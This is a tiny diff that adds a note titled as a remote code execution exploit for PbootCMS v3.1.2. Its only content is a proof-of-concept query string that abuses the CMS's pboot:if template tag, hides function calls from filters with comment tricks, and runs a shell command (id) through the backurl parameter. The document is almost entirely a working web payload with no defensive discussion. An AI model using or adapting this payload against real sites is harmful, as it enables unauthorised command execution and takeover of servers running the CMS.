@@ -1,0 +1,4 @@
+# PbootCMS v3.1.2 RCE
+
+POC:
+?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;id
